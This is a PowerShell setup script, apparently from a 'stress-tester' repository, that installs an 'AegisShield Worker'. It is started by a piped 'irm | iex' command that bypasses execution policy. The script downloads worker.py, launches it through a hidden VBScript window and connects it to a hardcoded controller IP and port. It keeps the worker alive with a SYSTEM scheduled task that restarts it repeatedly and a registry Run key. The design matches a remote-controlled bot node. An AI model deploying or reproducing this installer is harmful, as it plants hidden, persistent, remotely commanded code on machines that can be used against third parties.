# ═══════════════════════════════════════════════════════════════
#  AegisShield Worker — Windows Persistent Background Setup
#  Run as Admin:
#    powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/k4ran909/stress-tester/master/setup_worker.ps1 | iex"
# ═══════════════════════════════════════════════════════════════

param(
    [string]$ControllerIP = "159.65.32.13",
    [int]$ControllerPort = 7777
)

$ErrorActionPreference = "Stop"
$InstallDir = "C:\AegisShield"
$TaskName = "AegisWorker"
$RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$RegName = "AegisWorker"

Write-Host ""
Write-Host "  ╔═══════════════════════════════════════════════════╗" -ForegroundColor Red
Write-Host "  ║  AegisShield Worker — Windows Persistent Setup    ║" -ForegroundColor Red
Write-Host "  ║  Survives: Restart, Updates, Sleep, Logoff        ║" -ForegroundColor Red
Write-Host "  ╚═══════════════════════════════════════════════════╝" -ForegroundColor Red
Write-Host ""

# ── 1. Ensure Admin ────────────────────────────────────────────
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
if (-not $isAdmin) {
    Write-Host "  [!] Relaunching as Administrator..." -ForegroundColor Yellow
    $scriptUrl = "https://raw.githubusercontent.com/k4ran909/stress-tester/master/setup_worker.ps1"
    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -Command `"irm $scriptUrl | iex`""
    exit
}

# ── 2. Find Python ────────────────────────────────────────────
Write-Host "  [1/7] Checking Python..." -ForegroundColor Cyan
$python = $null
foreach ($cmd in @("python", "python3", "py")) {
    try {
        $ver = & $cmd --version 2>&1 | Out-String
        if ($ver -match "Python 3") {
            $python = (Get-Command $cmd).Source
            Write-Host "  [1/7] Python ✅ ($($ver.Trim())) at $python" -ForegroundColor Green
            break
        }
    }
    catch {}
}

if (-not $python) {
    Write-Host "  [1/7] Installing Python..." -ForegroundColor Yellow
    try {
        winget install Python.Python.3.12 --accept-package-agreements --accept-source-agreements --silent 2>&1 | Out-Null
        Start-Sleep -Seconds 5
        $env:PATH = [System.Environment]::GetEnvironmentVariable("PATH", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("PATH", "User")
        $python = (Get-Command python -ErrorAction Stop).Source
        Write-Host "  [1/7] Python installed ✅" -ForegroundColor Green
    }
    catch {
        Write-Host "  ❌ Install Python from python.org and retry" -ForegroundColor Red
        exit 1
    }
}

# ── 3. Create install directory ───────────────────────────────
Write-Host "  [2/7] Creating $InstallDir..." -ForegroundColor Cyan
New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null

# ── 4. Download worker.py ────────────────────────────────────
Write-Host "  [3/7] Downloading worker.py..." -ForegroundColor Cyan
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/k4ran909/stress-tester/master/worker.py" -OutFile "$InstallDir\worker.py" -UseBasicParsing

# ── 5. Create hidden launcher scripts ────────────────────────
Write-Host "  [4/7] Creating background launchers..." -ForegroundColor Cyan

# VBScript — runs Python with zero visible windows
@"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run """$python"" ""$InstallDir\worker.py"" --master ${ControllerIP}:${ControllerPort}", 0, False
"@ | Out-File -FilePath "$InstallDir\start_hidden.vbs" -Encoding ASCII

# Batch launcher (backup)
@"
@echo off
start /B "" "$python" "$InstallDir\worker.py" --master ${ControllerIP}:${ControllerPort}
"@ | Out-File -FilePath "$InstallDir\start_worker.bat" -Encoding ASCII

# ── 6. Kill ALL old instances ────────────────────────────────
Write-Host "  [5/7] Cleaning old instances..." -ForegroundColor Cyan
try { Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
try { Remove-ItemProperty -Path $RegKey -Name $RegName -ErrorAction SilentlyContinue } catch {}

Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like "*worker.py*--master*" } | ForEach-Object {
    Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
}
Start-Sleep -Seconds 2

# ── 7. LAYER 1: Scheduled Task (most reliable on Windows) ────
Write-Host "  [6/7] Creating Scheduled Task (auto-start on boot)..." -ForegroundColor Cyan

$action = New-ScheduledTaskAction `
    -Execute "wscript.exe" `
    -Argument """$InstallDir\start_hidden.vbs"""

# Trigger: at system startup AND every 5 minutes (in case it dies)
$triggerBoot = New-ScheduledTaskTrigger -AtStartup
$triggerRepeat = New-ScheduledTaskTrigger -Once -At (Get-Date) `
    -RepetitionInterval (New-TimeSpan -Minutes 5) `
    -RepetitionDuration (New-TimeSpan -Days 9999)

$settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -DontStopOnIdleEnd `
    -StartWhenAvailable `
    -RestartCount 9999 `
    -RestartInterval (New-TimeSpan -Minutes 1) `
    -ExecutionTimeLimit (New-TimeSpan -Days 9999) `
    -MultipleInstances IgnoreNew

$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask `
    -TaskName $TaskName `
    -Action $action `
    -Trigger @($triggerBoot, $triggerRepeat) `
    -Settings $settings `
    -Principal $principal `
    -Description "AegisShield Worker — connects to ${ControllerIP}:${ControllerPort}" `
    -Force | Out-Null

# ── 8. LAYER 2: Registry Run key (backup persistence) ────────
Write-Host "  [7/7] Adding Registry startup entry (backup)..." -ForegroundColor Cyan
try {
    New-ItemProperty -Path $RegKey -Name $RegName -Value "wscript.exe `"$InstallDir\start_hidden.vbs`"" -PropertyType String -Force | Out-Null
}
catch {}

# ── 9. Start NOW ──────────────────────────────────────────────
Start-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
Start-Sleep -Seconds 3

# ── Verify ────────────────────────────────────────────────────
$taskState = (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue).State
$procs = Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like "*worker.py*--master*" }
$procCount = ($procs | Measure-Object).Count

Write-Host ""
Write-Host "  ╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Green
Write-Host "  ║  ✅ WORKER INSTALLED PERMANENTLY                          ║" -ForegroundColor Green
Write-Host "  ╠═══════════════════════════════════════════════════════════╣" -ForegroundColor Green
Write-Host "  ║  Controller:  ${ControllerIP}:${ControllerPort}           " -ForegroundColor Cyan
Write-Host "  ║  Install dir: $InstallDir                                 " -ForegroundColor Cyan
Write-Host "  ║  Task state:  $taskState                                  " -ForegroundColor Cyan
Write-Host "  ║  Processes:   $procCount running                          " -ForegroundColor Cyan
Write-Host "  ║                                                           ║" -ForegroundColor Green
Write-Host "  ║  PERSISTENCE LAYERS:                                      ║" -ForegroundColor Yellow
Write-Host "  ║    ✅ Scheduled Task (SYSTEM, runs at boot)               ║" -ForegroundColor Green
Write-Host "  ║    ✅ Registry Run key (backup — runs at logon)           ║" -ForegroundColor Green
Write-Host "  ║    ✅ Auto-retry every 5 min if process dies              ║" -ForegroundColor Green
Write-Host "  ║    ✅ Auto-restart on failure (every 1 min)               ║" -ForegroundColor Green
Write-Host "  ║    ✅ Hidden — no window visible                          ║" -ForegroundColor Green
Write-Host "  ╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Green
Write-Host ""
Write-Host "  📋 Manage commands (run as Admin):" -ForegroundColor Yellow
Write-Host '     Get-ScheduledTask -TaskName AegisWorker            # check' -ForegroundColor White
Write-Host '     Stop-ScheduledTask -TaskName AegisWorker           # stop' -ForegroundColor White
Write-Host '     Start-ScheduledTask -TaskName AegisWorker          # start' -ForegroundColor White
Write-Host '     Unregister-ScheduledTask -TaskName AegisWorker     # remove task' -ForegroundColor White
Write-Host '     Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name AegisWorker  # remove reg' -ForegroundColor White
Write-Host '     Remove-Item -Recurse -Force C:\AegisShield         # full uninstall' -ForegroundColor White
Write-Host ""
